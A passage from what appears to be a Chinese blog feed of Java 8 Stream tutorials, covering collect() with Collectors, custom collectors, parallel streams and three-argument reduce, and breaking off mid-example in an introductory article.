        <content type="html"><![CDATA[<p>我们前面的五篇文章基本都是在说将一个集合转成一个流，然后对流进行操作，其实这种操作是最多的，但有时候我们也是需要从流中收集起一些元素，并以集合的方式返回，我们把这种反向操作称为收集。</p><p>流API也给我们提供了相应的方法。</p><h4 id="如何在流中使用收集功能？"><a href="#如何在流中使用收集功能？" class="headerlink" title="如何在流中使用收集功能？"></a>如何在流中使用收集功能？</h4><p>我们先看一看流API给我们提供的方法：</p><pre class="line-numbers language-none"><code class="language-none">public interface Stream&lt;T&gt; extends BaseStream&lt;T, Stream&lt;T&gt;&gt; &#123;&#x2F;&#x2F;...忽略那些不重要的东西&lt;R&gt; R collect(Supplier&lt;R&gt; supplier,                  BiConsumer&lt;R, ? super T&gt; accumulator,                  BiConsumer&lt;R, R&gt; combiner);&lt;R, A&gt; R collect(Collector&lt;? super T, A, R&gt; collector);｝<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>流API中给我们提供了两种，我给大家分析一下</p><p><strong>&lt;R, A&gt; R collect(Collector&lt;? super T, A, R&gt; collector);</strong></p><p>其中R指定结果的类型，T指定了调用流的元素类型。内部积累的类型由A指定。collectorFunc是一个收集器，指定收集过程如何执行，collect()方法是一个终端方法。</p><p>虽然我们基本上很少会用到自定义的collectorFunc,但是了为扩展大家的知识面，我们还是简单地聊一聊Collector，Because it’s my style! </p><p><code>Collector</code>接口位于<code>java.util.stream</code>包中的声明，它的容颜是这样的：</p><pre class="line-numbers language-none"><code class="language-none">package java.util.stream;public interface Collector&lt;T, A, R&gt; &#123;      Supplier&lt;A&gt; supplier();      BiConsumer&lt;A, T&gt; accumulator();      BinaryOperator&lt;A&gt; combiner();      Function&lt;A, R&gt; finisher();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中T、A、R的含义和上面是一样的<code>其中R指定结果的类型，T指定了调用流的元素类型。内部积累的类型由A指定</code>。</p><p>但是这一篇我们不实现他们，因为JDK已经给我们提供了很强大的方法了，他们位于<code>java.util.stream</code>下面的<code>Collectors</code>类，我们本篇也主要是使用<code>Collectors</code>来实现收集的功能。</p><p><code>Collectors</code>类是一个最终类，里面提供了大量的静态的收集器方法，借助他，我们基本可以实现各种复杂的功能了。</p><p>我们来看一下toList和toSet方法:</p><pre class="line-numbers language-none"><code class="language-none">public static &lt;T&gt;  Collector&lt;T, ?, List&lt;T&gt;&gt; toList()public static &lt;T&gt; Collector&lt;T, ?, Set&lt;T&gt;&gt; toSet()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中<code>Collectors#toList()</code>返回的收集器可以把流中元素收集到一个List中，<code>Collectors#toSet()</code>返回的收集器可以把流中的元素收集到一个Set中。比如：如果你想把元素收集到List中，你可以这样用，<code>steam.collect(Collectors.toList)</code>。</p><p>接下来，我们把我们的王者荣耀团队经济例子修改一下，把明星玩家和当前获得的金币数收集到一个List里面，把出场的英雄收集到一个Set里面：</p><pre class="line-numbers language-none"><code class="language-none">#玩家使用的英雄以及当前获得的金币数public class HeroPlayerGold &#123;    &#x2F;** 使用的英雄名字 *&#x2F;    private String hero;    &#x2F;** 玩家的ID *&#x2F;    private String player;    &#x2F;** 获得的金币数 *&#x2F;    private int gold;    public HeroPlayerGold(String hero, String player, int gold) &#123;        this.hero &#x3D; hero;        this.player &#x3D; player;        this.gold &#x3D; gold;    &#125;    @Override    public String toString() &#123;        return &quot;HeroPlayerGold&#123;&quot; +                &quot;hero&#x3D;&#39;&quot; + hero + &#39;\&#39;&#39; +                &quot;, player&#x3D;&#39;&quot; + player + &#39;\&#39;&#39; +                &quot;, gold&#x3D;&quot; + gold +                &#39;&#125;&#39;;    &#125;&#x2F;&#x2F;省略get&#x2F;set&#125;#出场的英雄public class Hero &#123;    &#x2F;** 使用的英雄名字 *&#x2F;    private String hero;    public Hero(String hero) &#123;        this.hero &#x3D; hero;    &#125;    @Override    public String toString() &#123;        return &quot;Hero&#123;&quot; +                &quot;hero&#x3D;&#39;&quot; + hero + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#x2F;&#x2F;省略get&#x2F;set&#125;#测试类public class Main &#123;    public static void main(String[] args) &#123;        learnCollect();    &#125;    private static void learnCollect() &#123;        List&lt;HeroPlayerGold&gt; lists &#x3D; new ArrayList&lt;&gt;();        lists.add(new HeroPlayerGold(&quot;盖伦&quot;, &quot;RNG-Letme&quot;, 100));        lists.add(new HeroPlayerGold(&quot;诸葛亮&quot;, &quot;RNG-Xiaohu&quot;, 300));        lists.add(new HeroPlayerGold(&quot;露娜&quot;, &quot;RNG-MLXG&quot;, 300));        lists.add(new HeroPlayerGold(&quot;狄仁杰&quot;, &quot;RNG-UZI&quot;, 500));        lists.add(new HeroPlayerGold(&quot;牛头&quot;, &quot;RNG-Ming&quot;, 500));        List&lt;PlayerGold&gt; playerGolds &#x3D; lists.stream()                .map(plary -&gt; new PlayerGold(plary.getPlayer(), plary.getGold()))                .collect(Collectors.toList());        System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;PlayerGold begin&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);        playerGolds.forEach(System.out::println);        System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;PlayerGold end&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);        Set&lt;Hero&gt; heroes &#x3D; lists.stream().map(player -&gt; new Hero(player.getHero())).collect(Collectors.toSet());        System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hero begin&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);        heroes.forEach(System.out::println);        System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hero end&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出的日志：</p><pre class="line-numbers language-none"><code class="language-none">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;PlayerGold begin&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;PlayerGold&#123;player&#x3D;&#39;RNG-Letme&#39;, gold&#x3D;100&#125;PlayerGold&#123;player&#x3D;&#39;RNG-Xiaohu&#39;, gold&#x3D;300&#125;PlayerGold&#123;player&#x3D;&#39;RNG-MLXG&#39;, gold&#x3D;300&#125;PlayerGold&#123;player&#x3D;&#39;RNG-UZI&#39;, gold&#x3D;500&#125;PlayerGold&#123;player&#x3D;&#39;RNG-Ming&#39;, gold&#x3D;500&#125;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;PlayerGold end&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hero begin&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hero&#123;hero&#x3D;&#39;露娜&#39;&#125;Hero&#123;hero&#x3D;&#39;牛头&#39;&#125;Hero&#123;hero&#x3D;&#39;盖伦&#39;&#125;Hero&#123;hero&#x3D;&#39;狄仁杰&#39;&#125;Hero&#123;hero&#x3D;&#39;诸葛亮&#39;&#125;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hero end&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到这里，大家有感受到流API的威力了吗？提示一下，封装一个工具类，然后结合一FastJson这种东西一起使用！是真的好用啊！其实将数据从集合移到流中，或者将数据从流移回集合的能力，是流API给我们提供的一个强大特性，因为这允许通过流来操作集合，然后把流重新打包成集合。此外，条件合适的时候，让流操作并行发生，提高效率。</p><p>接下来我们分析第二个方法，</p><pre class="line-numbers language-none"><code class="language-none">&lt;R&gt; R collect(Supplier&lt;R&gt; supplier,                 BiConsumer&lt;R, ? super T&gt; accumulator,                 BiConsumer&lt;R, R&gt; combiner);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们第二个版本的收集方法，主要是可以在收集的过程中，给予更多的控制。其中supplier指定如何创建用于保存结果的对象，比如，要使用ArrayList作为结果的集合，需要指定它的构造函数，accumulator函数是将一个元素添加到结果中，而combiner函数合并两个部分的结果。</p><p>大家应该发现了吧，他的工作方式和我们第三篇介绍缩减操作时的reduce方法是很像的。它们都必须是无状态和不干预的，并且必须有关联性，三个约束条件缺一不可。</p><p><code>Supplier</code>也是<code>java.util.function</code>包中的一个函数式接口:</p><pre class="line-numbers language-none"><code class="language-none">@FunctionalInterfacepublic interface Supplier&lt;T&gt; &#123;    T get();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个get()，并且是没有参数的，在collect()方法返回一个R类型的对象，并且get()方法返回一个指向集合的引用。</p><p>而accumulator,combiner的类型是<code>BiConsumer</code>，他们也是<code>java.util.function</code>包中的一个函数式接口:</p><pre class="line-numbers language-none"><code class="language-none">@FunctionalInterfacepublic interface BiConsumer&lt;T, U&gt; &#123;    void accept(T t, U u);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中t,u执行某种类型的操作，对于accumulator来说，t指定了目标集合，u指定了要添加到该集合的元素。对于combiner来说，t和u指定的是两个要被合并的集合。</p><p>我们把前面的例子改变一下，然后也详细地说一下，在没有用lambda和使用lambda之后的区别：</p><p>这个是没有使用lambda前的：</p><pre class="line-numbers language-none"><code class="language-none">private static void learnCollect() &#123;        List&lt;HeroPlayerGold&gt; lists &#x3D; new ArrayList&lt;&gt;();        lists.add(new HeroPlayerGold(&quot;盖伦&quot;, &quot;RNG-Letme&quot;, 100));        lists.add(new HeroPlayerGold(&quot;诸葛亮&quot;, &quot;RNG-Xiaohu&quot;, 300));        lists.add(new HeroPlayerGold(&quot;露娜&quot;, &quot;RNG-MLXG&quot;, 300));        lists.add(new HeroPlayerGold(&quot;狄仁杰&quot;, &quot;RNG-UZI&quot;, 500));        lists.add(new HeroPlayerGold(&quot;牛头&quot;, &quot;RNG-Ming&quot;, 500));        lists.stream().collect(new Supplier&lt;HashSet&lt;HeroPlayerGold&gt;&gt;() &#123;                                   @Override                                   public HashSet&lt;HeroPlayerGold&gt; get() &#123;                                       return new HashSet&lt;&gt;();                                   &#125;                               &#125;,&#x2F;&#x2F;第一个参数                new BiConsumer&lt;HashSet&lt;HeroPlayerGold&gt;, HeroPlayerGold&gt;() &#123;                    @Override                    public void accept(HashSet&lt;HeroPlayerGold&gt; heroPlayerGolds, HeroPlayerGold heroPlayerGold) &#123;                        heroPlayerGolds.add(heroPlayerGold);                    &#125;                &#125;,&#x2F;&#x2F;第二个参数                new BiConsumer&lt;HashSet&lt;HeroPlayerGold&gt;, HashSet&lt;HeroPlayerGold&gt;&gt;() &#123;                    @Override                    public void accept(HashSet&lt;HeroPlayerGold&gt; heroPlayerGolds, HashSet&lt;HeroPlayerGold&gt; heroPlayerGolds2) &#123;                        heroPlayerGolds.addAll(heroPlayerGolds2);                    &#125;                &#125;&#x2F;&#x2F;第三个参数        ).forEach(System.out::println);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在没有使用lambda前，虽然看起来的让人眼花缭乱的，但不得不说，他其实能帮助我们实现非常强大的功能，我们自定义的收集过程，全部都可以交给这个家伙，我们用lambda整理一下：</p><pre class="line-numbers language-none"><code class="language-none">private static void learnCollect() &#123;        List&lt;HeroPlayerGold&gt; lists &#x3D; new ArrayList&lt;&gt;();        lists.add(new HeroPlayerGold(&quot;盖伦&quot;, &quot;RNG-Letme&quot;, 100));        lists.add(new HeroPlayerGold(&quot;诸葛亮&quot;, &quot;RNG-Xiaohu&quot;, 300));        lists.add(new HeroPlayerGold(&quot;露娜&quot;, &quot;RNG-MLXG&quot;, 300));        lists.add(new HeroPlayerGold(&quot;狄仁杰&quot;, &quot;RNG-UZI&quot;, 500));        lists.add(new HeroPlayerGold(&quot;牛头&quot;, &quot;RNG-Ming&quot;, 500));        lists.stream().collect(() -&gt; new HashSet&lt;&gt;(),                                (set,elem)-&gt;set.add(elem),                                (setA,setB)-&gt;setA.addAll(setB)        ).forEach(System.out::println);        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大家以为到这里就结束了吗？其实还可以使用方法引用和构造函数引用来简化：</p><pre class="line-numbers language-none"><code class="language-none">private static void learnCollect() &#123;        List&lt;HeroPlayerGold&gt; lists &#x3D; new ArrayList&lt;&gt;();        lists.add(new HeroPlayerGold(&quot;盖伦&quot;, &quot;RNG-Letme&quot;, 100));        lists.add(new HeroPlayerGold(&quot;诸葛亮&quot;, &quot;RNG-Xiaohu&quot;, 300));        lists.add(new HeroPlayerGold(&quot;露娜&quot;, &quot;RNG-MLXG&quot;, 300));        lists.add(new HeroPlayerGold(&quot;狄仁杰&quot;, &quot;RNG-UZI&quot;, 500));        lists.add(new HeroPlayerGold(&quot;牛头&quot;, &quot;RNG-Ming&quot;, 500));        lists.stream().collect(HashSet::new,                               HashSet::add,                               HashSet::addAll        ).forEach(System.out::println);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h4><p>本篇带大家入门了Stream的收集操作，但是有了些这入门操作，我相信，你在我的演变过程中已经发现了扩展点了，不管是supplier，accumulator还是combiner，都可以在里面放一些特别的操作进去，从而满足你们的各种要求。</p><p>另外一个点，大家一定不要忘记了Collectors这个最终类，里面已经提供了很多很强大的静态方法，如果你们遇到一些特别的需求，首先要想到的应该是Collectors，如果里面的方法都不能实现你的要求，再考虑通过第二个版本的collect()方法实现你的自定义收集过程吧。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 8 新特性之 Stream 流（四）并行流</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E5%9B%9B%EF%BC%89%E5%B9%B6%E8%A1%8C%E6%B5%81/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E5%9B%9B%EF%BC%89%E5%B9%B6%E8%A1%8C%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<p>随着对流API认识的慢慢深入，本章我们要讨论的知识点是流API里面的并行流了。</p><p>在开始讨论并行流之前，我先引发一下大家的思考，就你看到这篇文章的时间，你们是不是经常听到，Intel i7 CPU什么8核16线程，什么Android手机8核4GB这种消息，既然我们是处于一个多核处理器的时代，你们有没有想过并行地操作数组和集合框架，从而高速地执行我们对数组或者集合的一些操作呢？</p><p>或许你有想过这个问题，但是因为并行编程比较复杂，所以这些想法还停留在你的脑海当中，又或者你已经在路上了，反正你们就是最棒的（我他妈都这么夸你们了，就不能点个喜欢？）。</p><p>不管如何，在你看到这一篇文章的时候，我将带你走向并行地操作数组或者集合，当然是使用我们的并行流知识啦。</p><h4 id="并行流"><a href="#并行流" class="headerlink" title="并行流"></a>并行流</h4><p>并行编程可谓是十分复杂并且很容易出错的，这估计就是我们绝大部分人的拦脚石。刚好Stream流库给我们解决了这个问题，在流API库里面提供了轻松可靠的并行操作。要想并行处理流相当简单，只需要使用一个并行流就可以了。</p><p>如第二篇文章中提到的那样，我们获取一个并行流是非常简单的，只需要对流调用一下parallel()就可以获取到一个并行流了（什么你居然不知道？那么多人看了我的文章，估计你要被他们甩开几条街了，赶紧回去看吧。），第二种方式就更加简单了，我们可以使用Collection接口提供给我们parallelStream(),也是可以获取到一个并行流的。</p><p>当然，并行操作肯定是需要环境支持的，你搞了一台一核一线程的小霸王，来跑我的高大上并行流，我也只能慢慢来了。如果你不是小霸王，那我们可以开始这节课的实战了，先拿上一篇的例子来改一下先，如果你不认真观察，你都找不出他们的不同之处：</p><pre class="line-numbers language-none"><code class="language-none">public class Main &#123;    public static void main(String[] args) &#123;        learnStream();    &#125;    private static void learnStream() &#123;        List&lt;Integer&gt; lists &#x3D; new ArrayList&lt;&gt;();        lists.add(1);        lists.add(2);        lists.add(3);        lists.add(4);        lists.add(5);        lists.add(6);        Optional&lt;Integer&gt; sum &#x3D; lists.parallelStream().reduce((a, b) -&gt; a + b);&#x2F;&#x2F;这里把stream()换成了parallelStream（）        if (sum.isPresent()) System.out.println(&quot;list的总和为:&quot; + sum.get());&#x2F;&#x2F;21        &#x2F;&#x2F;&lt;&#x3D;&#x3D;&#x3D;&#x3D;&gt; lists.stream().reduce((a, b) -&gt; a + b).ifPresent(System.out::println);        Integer sum2 &#x3D; lists.stream().reduce(0, (a, b) -&gt; a + b);&#x2F;&#x2F;21        System.out.println(&quot;list的总和为:&quot; + sum2);        Optional&lt;Integer&gt; product &#x3D; lists.stream().reduce((a, b) -&gt; a * b);        if (product.isPresent()) System.out.println(&quot;list的积为:&quot; + product.get());&#x2F;&#x2F;720        Integer product2 &#x3D; lists.parallelStream().reduce(1, (a, b) -&gt; a * b);&#x2F;&#x2F;这里把stream()换成了parallelStream（）        System.out.println(&quot;list的积为:&quot; + product2);&#x2F;&#x2F;720    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到结果和上一篇文章的一模一样。但是因为乘法和加法操作是可以发生在不同的线程里面的，因此这两个例子，在数据源足够大的时候，他们的运行的时间，差别相当地大了啊。</p><p>一般来说，应用到并行流的任何操作都必须是符合缩减操作的三个约束条件，无状态，不干预，关联性！因为这三大约束确保在并行流上执行操作的结果和在顺序流上执行的结果是相同的。</p><p>我们在上一篇讲缩减操作的时候，提到了三个reduce(),但是我们只讲了两个，我就不和你们皮了，直接开讲剩下的那一个，在并行流里面，你们会发现这个版本的reduce()才是真爱啊！</p><pre class="line-numbers language-none"><code class="language-none">public interface Stream&lt;T&gt; extends BaseStream&lt;T, Stream&lt;T&gt;&gt; &#123;&#x2F;&#x2F;、、、忽略其他无关紧要的元素&lt;U&gt; U reduce(U identity,          BiFunction&lt;U, ? super T, U&gt; accumulator,          BinaryOperator&lt;U&gt; combiner);｝<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在reduce()的这个版本当中，accumulator被称为累加器，combiner被称为合成器，combiner定义的函数将accumulator提到的两个值合并起来，因此，我们可以把上面的那个例子改成：</p><pre class="line-numbers language-none"><code class="language-none">private static void reduce3th() &#123;    List&lt;Integer&gt; lists &#x3D; new ArrayList&lt;&gt;();    lists.add(1);    lists.add(2);    lists.add(3);    lists.add(4);    lists.add(5);    lists.add(6);    Integer product2 &#x3D; lists.parallelStream().reduce(1, (a, b) -&gt; a * b,                                                        (a, b) -&gt; a * b);    System.out.println(&quot;list的积为:&quot; + product2);&#x2F;&#x2F;720&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>他们得到的结果还是一样的。</p><p>你们可能以为accumulator和combiner执行的操作是相同的，但其实他们是可以不同的，下面的例子，你们要认真看了：假设List里面有三个Integer类型的元素分别为1，2，3。</p><p>现在的需求是分别让List里面的每个元素都放大两倍后，再求积。这个需求的正确答案应该是48;</p><pre class="line-numbers language-none"><code class="language-none">private static void reduce3th() &#123;    List&lt;Integer&gt; lists &#x3D; new ArrayList&lt;&gt;();    lists.add(1);    lists.add(2);    lists.add(3);    Integer product &#x3D; lists.parallelStream().reduce(1, (a, b) -&gt; a *  (b * 2),                                                       (a, b) -&gt; a * b);    System.out.println(&quot;product:&quot; + product);&#x2F;&#x2F;48&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>累加器部分是将两个元素分别放大两倍后，再相乘,合并器，是将两个部分相乘！如果能理解这里，恭喜你，你的技能有相当大的长进了！估计Stream流你就可以无往而不利了。</p><p>如果你还不能理解，就应该继续往下看了，跟着我的步伐慢慢走：</p><pre class="line-numbers language-none"><code class="language-none">    累加器部分（水平向右）        accumulator-----------------------------›thread-1:   1 * 1 * 2   &#x3D;   2    |    合并器方向（竖直向下）thread-2:   1 * 2 * 2   &#x3D;   4    |         combinerthread-3:   1 * 3 * 2   &#x3D;   6    |   因此最终的答案是2  *  4  *  6  &#x3D;   48（没毛病）                                 ˇ注：水平方向最前面的1就是identity的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，accumulator和combiner执行的操作是不是一定不能相同了。理解这些，对于理解并行流是非常重要的。</p><p>如果此时的combiner还是和accumulator相同，那么结果是什么样的呢：请看：</p><pre class="line-numbers language-none"><code class="language-none">private static void reduce3th() &#123;    List&lt;Integer&gt; lists &#x3D; new ArrayList&lt;&gt;();    lists.add(1);    lists.add(2);    lists.add(3);    Integer product &#x3D; lists.parallelStream().reduce(1, (a, b) -&gt; a *  (b * 2),                                                       (a, b) -&gt; a * b * 2 );    System.out.println(&quot;product:&quot; + product);&#x2F;&#x2F;192&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>192这个答案是怎么来的？</p><pre class="line-numbers language-none"><code class="language-none">    累加器部分（水平向右）        accumulator-----------------------------›thread-1:   1 * 1 * 2   &#x3D;   2          |    合并器方向（竖直向下）thread-2:   1 * 2 * 2   &#x3D;   4  *  2    |         combinerthread-3:   1 * 3 * 2   &#x3D;   6  *  2    |   因此最终的答案是2  *  （ 4  *  2 ） *  （6  *  2）  &#x3D;   192（没毛病）                                       ˇ注：水平方向最前面的1就是identity的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="顺序流-并行流-无序流之间的切换操作"><a href="#顺序流-并行流-无序流之间的切换操作" class="headerlink" title="顺序流&amp;并行流&amp;无序流之间的切换操作"></a>顺序流&amp;并行流&amp;无序流之间的切换操作</h4><p>对于这三种流的切换，在BaseStream接口中提供了相应的方法，如果你还没有记住，回头再看一下第二篇文章吧。</p><p>关于使用并行流的时候，还有一个点需要记住：如果集合中或者数组中的元素是有序的，那么对应的流也是有序的。但是在使用并行流时，有时候流是无序的就能获得性能上的提升。因为如果流是无序的，那么流的每个部分都可以被单独的操作，而不需要与其他部分协调，从而提升性能。（又是无状态，说好的退休了呢）。所以当流操作的顺序不重要的时候，可以通过BaseStream接口提供的unordered()方法把流转换成一个无序流之后，再进行各种操作。</p><p>另外一点:forEach()方法不一定会保留并行流的顺序，如果在对并行流的每个元素执行操作时，也希望保留顺序，那么可以使用forEachOrdered()方法，它的用法和forEach()是一样的。因为在发布第一篇文章的时候，大家对forEach的反应比较大，很多人其实对forEach都有想法：比如调试难，等等。借这个机会，我谈一谈我对for&amp;forEach的看法。</p><p>我们在访问一个数组元素的时候，最快的方式肯定是通过索引去访问的吧，而for循环遍历的时候就是通过下标进行的，所以效率那是相当的高，但是当我们的数据结构不是数组的时候，比如是链表的时候，可想而知，for循环的效率是有多低，但是forEach底层采用的是迭代器的方式，他对数据结构是没有要求的，不管上层的数据结构是什么，他都能保证高效地执行！</p><p>因此我的最终答案:如果数据结构是ArrayList这种数据结构，那你可以采用for,但是你的数据结构如果是LinkList那你千万别再用for,应该果断采用forEach,因为数据一多起来的，for此时的效率低得可怜，说不定你的机器就瘫痪了。这也是优化的一个小技巧吧，希望能帮助大家。</p><h4 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h4><p>并行流学会了，你的功力，真的就增长了。效率再也不是问题了，基本上关于并行流的方方面面，这篇文章都已经说提到了，但是Stream在JDK中的变化还是挺快的，我一旦发现有什么改动，会最快地更新这篇文章。下一篇我们继续探索新知识点。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 8 新特性之Stream流</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8BStream%E6%B5%81/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8BStream%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<h2 id="是什么是Stream流"><a href="#是什么是Stream流" class="headerlink" title="是什么是Stream流"></a>是什么是Stream流</h2><p><code>java.util.stream.Stream</code></p><p>Stream流和传统的IO流，它们都叫流，却是两个完全不一样的概念和东西。</p><p>流可以简单的说是处理数据集合的东西，可以申明式流式API来处理集合，而不是写一个逻辑实现。</p><h2 id="流分类"><a href="#流分类" class="headerlink" title="流分类"></a>流分类</h2><p>流分为顺序流及并行流，顺序流即每个指令按顺序执行，并行流即集合里面的操作并行执行。</p><pre class="line-numbers language-none"><code class="language-none">List&lt;Integer&gt; numbers &#x3D; Arrays.asList(1, 2, 3);&#x2F;&#x2F;　顺序流numbers.stream().forEach(n -&gt; System.out.print(n));&#x2F;&#x2F;并行流numbers.parallelStream().forEach(n -&gt; System.out.print(n));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上例子，顺序流总是输出<code>123</code>，而并行流则每次结果都不一定，并行流使用了ForkJoinPool分而治之，所以明白了ForkJoinPool原理的同学就知道并行流的真面目了。</p><h2 id="创建流"><a href="#创建流" class="headerlink" title="创建流"></a>创建流</h2><p>1、调用集合的stream()方法或者parallelStream()方法。</p><p>2、Stream.of()方法，有针对int,long的专用流IntStream，LongStream。</p><h2 id="使用流"><a href="#使用流" class="headerlink" title="使用流"></a>使用流</h2><p>以下举了流的一些常用的用法。</p><pre class="line-numbers language-none"><code class="language-none">public class StreamTest &#123;public static void main(String[] args) &#123;System.out.println(&quot;过滤－找出年纪大于18岁的人&quot;);List&lt;User&gt; list &#x3D; initList();list.stream().filter((User user) -&gt; user.getAge() &gt; 18).collect(Collectors.toList()).forEach(System.out::println);System.out.println();System.out.println(&quot;最大值－找出最大年纪的人&quot;);list &#x3D; initList();Optional&lt;User&gt; max &#x3D; list.stream().max((u1, u2) -&gt; u1.getAge() - 